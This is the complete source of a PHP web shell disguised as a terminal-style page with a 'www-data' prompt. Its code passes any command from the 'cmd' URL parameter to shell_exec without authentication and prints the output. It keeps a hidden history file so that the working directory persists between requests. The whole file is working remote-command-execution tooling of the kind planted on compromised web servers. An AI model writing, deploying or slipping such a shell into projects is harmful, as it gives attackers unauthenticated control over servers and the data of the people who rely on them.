<html>
 <!--a bit of css to make it look nice -->
<style>
 body {
    background-color: #1d1f21;
    color: #c5c8c6;
    font-size: 15px;
} 
input.command {
    position: fixed;
    border-radius: 0px;
    border-color: #161616;
    border-width: 1;
    border-style: solid;
    box-shadow: -0px -1px #262626;
    background-color: #1d1f21;
    left: 0px;
    bottom: 0px;
    padding: 5px;
    color: #c5c8c6;
    width: 100%;
    font-size: 20px;
}
.label {
    background-color: #1d1f21;
    padding: 2px;
    font-family: monospace;
    font-size: 15px;
    bottom: 35px;
    font-weight: bold;
    border-color: #1d1f21;
    border-width: 2;
    border-style: solid;

}
label.path {
    position: fixed;
    left: 95px;
    color: #79a8e7;
}
label.user {
    position: fixed;
    float: left
    left: 0px;
    color: #46c048;
}
</style>
<body>
 <!--The input, where the user writes the command, and the current location of the use-->
    <form method="GET" name="<?php echo basename($_SERVER['PHP_SELF']); ?>">
        <label for="cmd" class="label path" id="label">~</label>
        <label for="cmd" class="label user" id="name">www-data:</label>
        <input type="TEXT" name="cmd" id="cmd"  class="command">
    </form>
    <pre>


    
      <?php
            //test if a command was written
            if($_GET['cmd'])
            {
                //get what has been done already from the .historico file                
                $buffer = file_get_contents(".historico");
                
                //finds out our current working directory
                $file = ".cmdOutput";
                $data = file($file);
                $line = $data[count($data)-1];
                $string = trim(preg_replace('/\s+/', ' ', $line));
                //executes all commands that were executed before, and echoes the command we are executing now, 
                //as well as the user (www-data) and the current working directory, so we know what command was executed
                //the stderr (2) gets redirected to the stdout (1) using "2>&1", so it shows up at the user screen
                $var = shell_exec($buffer."echo \"www-data:".$string." ".$_GET['cmd']."\";".$_GET['cmd']." 2>&1");

                //prints the output at the screen
                echo $var."\n\n";    
                //opens the .historico file and appends the commands we just executed
                $fp = fopen('.historico', 'a');        
                fwrite($fp,"echo \"www-data:".$string." ".$_GET['cmd']."\";");
                fwrite($fp,$_GET['cmd']." 2>&1");
                fwrite($fp,";");
                fclose($fp);  
                //finds out where we are (working directory) and saves it in a file
                $buffer = file_get_contents(".historico");
                $var = (string)shell_exec($buffer."pwd");
                $filename = ".cmdOutput";
                file_put_contents($filename, $var);
            }
            

            
        ?>

        <?php 
        //the last item in cmdOutput is our current working directory
        //finds it out to show it to the user
        $file = ".cmdOutput";
        $data = file($file);
        $line = $data[count($data)-1];
        $string = trim(preg_replace('/\s+/', ' ', $line));
        ?>
        <script type="text/javascript">
        var str = "<?php echo $string ?>";
        document.getElementById('label').innerHTML = str;
        window.scrollTo(0,document.body.scrollHeight);
        </script>


        
    </pre>
</body>
<!-- gets the command that the user typed in -->
<script>document.getElementById("cmd").focus();</script>
</html>